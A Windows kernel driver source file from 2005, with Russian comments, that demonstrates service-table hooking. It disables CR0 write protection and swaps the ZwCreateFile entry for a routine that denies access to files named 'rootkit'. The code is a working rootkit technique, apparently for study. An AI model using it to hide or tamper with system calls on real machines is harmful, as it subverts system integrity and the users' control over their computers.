// (С) Зайцев Олег, 2005
#include "StdAfx.h"
#include <ntddk.h>
#include <ntdef.h>
#include <rkdrv.h>

// Глобальные переменные - указатели на объекты "Устройство" и "Контекст устройства"
PDEVICE_OBJECT  gpDeviceObject  = NULL;
PDEVICE_CONTEXT gpDeviceContext = NULL;

extern "C" {
	// Указатель на SDT
	extern PSERVICE_DESCRIPTOR_TABLE    KeServiceDescriptorTable;

	// Номер сборки NT - для анализа
	extern  PWORD						NtBuildNumber;
}


typedef NTSTATUS 
(NTAPI *PZwCreateFile) (
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN PLARGE_INTEGER  AllocationSize  OPTIONAL,
    IN ULONG  FileAttributes,
    IN ULONG  ShareAccess,
    IN ULONG  CreateDisposition,
    IN ULONG  CreateOptions,
    IN PVOID  EaBuffer  OPTIONAL,
    IN ULONG  EaLength
    );

PZwCreateFile OldZwCreateFile;

NTSTATUS MyZwCreateFile(
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN PLARGE_INTEGER  AllocationSize  OPTIONAL,
    IN ULONG  FileAttributes,
    IN ULONG  ShareAccess,
    IN ULONG  CreateDisposition,
    IN ULONG  CreateOptions,
    IN PVOID  EaBuffer  OPTIONAL,
    IN ULONG  EaLength
    )
{
 
   DbgPrint("%ws \n", ObjectAttributes->ObjectName->Buffer);
   // Блокировка доступа к файлу, содержащему строку "rootkit"
   if (wcsstr(ObjectAttributes->ObjectName->Buffer, L"rootkit") != NULL) {
	   DbgPrint("Lock file !!!!\n");
	   return STATUS_ACCESS_DENIED;
   }
 // Вызов исходной функции
 return OldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, 
	  IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
	  CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

VOID SetKiSTHook()
{
 DWORD OldCR0;	
  
 // Повышение приоритета
 KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
 
 // Сброс WP бита
_asm {
    mov eax,CR0 
    mov OldCR0,eax
    and eax,0xFFFEFFFF			
    mov cr0, eax
 }
	
 switch (*NtBuildNumber) {
  case  2195:  // Win 2k
     OldZwCreateFile = (PZwCreateFile)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20];
	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20]   = (NTPROC)*MyZwCreateFile;
	 break;
  case 2600:   // Win XP
     OldZwCreateFile = (PZwCreateFile)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25];
	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25]   = (NTPROC)*MyZwCreateFile;
	 break;
  case 3790:  // W2K3
     OldZwCreateFile = (PZwCreateFile)*KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27];
	 KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27]   = (NTPROC)*MyZwCreateFile;
	 break;
}

 // Восстановление WP бита
 _asm {
	 mov eax,OldCR0		
     mov cr0,eax
 }
 // Восстановление приоритета
 KeLowerIrql(OldIRQL);
}


VOID DeleteKiSTHook()
{
 DWORD OldCR0;	
  
 // Повышение приоритета
 KIRQL OldIRQL = KeRaiseIrqlToDpcLevel();			 
 
 // Сброс WP бита
_asm {
    mov eax,CR0 
    mov OldCR0,eax
    and eax,0xFFFEFFFF			
    mov cr0, eax
 }
	
 switch (*NtBuildNumber) {
  case  2195:  // Win 2k
     KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x20] = (NTPROC)*OldZwCreateFile;	 
	 break;
  case 2600:   // Win XP
     KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x25] = (NTPROC)*OldZwCreateFile;	 
	 break;
  case 3790:  // W2K3
     KeServiceDescriptorTable->ntoskrnl.ServiceTable[0x27] = (NTPROC)*OldZwCreateFile;	 
	 break;
}

 // Восстановление WP бита
 _asm {
	 mov eax,OldCR0		
     mov cr0,eax
 }
 // Восстановление приоритета
 KeLowerIrql(OldIRQL);
}


// ***** Выгрузка драйвера *****
void DriverUnload (PDRIVER_OBJECT pDriverObject)
{
 DeleteKiSTHook();
 return;
}

// ***** Точка входа в драйвер *****
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pusRegistryPath)
{
	NTSTATUS          InitRes = STATUS_SUCCESS;	
	SetKiSTHook();
    // Подключение обработчика выгрузки драйвера
    pDriverObject->DriverUnload  = DriverUnload;
	// Возврат результата инициализации
    return InitRes;
}